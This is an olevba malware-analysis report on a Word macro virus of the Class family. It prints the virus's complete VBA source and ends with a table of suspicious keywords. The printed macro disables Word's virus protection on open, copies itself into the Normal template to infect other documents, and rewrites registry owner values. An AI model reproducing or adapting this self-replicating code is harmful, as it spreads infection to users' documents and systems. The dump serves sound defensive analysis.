olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.bu-a922f45599adb19db0d7d48a71c53aadeb46620a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.bu-a922f45599adb19db0d7d48a71c53aadeb46620a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
Const REG_SZ As Long = 1
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
Const HKEY_CURRENT_USER As Long = &H80000001
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
Sub AutoOpen()
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
On Error GoTo out
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
Options.VirusProtection = False
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
Options.SaveNormalPrompt = False
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
Options.ConfirmConversions = False
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
If nt > 70 And ad > 0 Then GoTo out
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
If nt < 70 Then
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
End If
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc

'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
host.codemodule.AddFromFile ("c:\class.sys")
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
With host.codemodule
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
    For x = 1 To 16
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
    .deletelines 1
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
    Next x
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
End With
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
If nt < 70 Then
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
    With host.codemodule
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
    .replaceline 1, "Sub AutoClose()"
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
    .replaceline 91, "Sub ToolsMacro()"
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
    For x = 70 To 81
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
        .deletelines 62
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
    Next x
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
    .replaceline 35, "    For x = 1 To 4"
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
    End With
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
End If
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
If nt < 70 Then
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
u = RegCloseKey(k)
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
End If
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
With host.codemodule
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
    For x = 2 To 104 Step 2
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
    Next x
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
End With
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
out:
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
End Sub
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
Sub ViewVBCode()
'Mike Pavluschick19.02.99 14:03:13GoatW8-2.doc
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
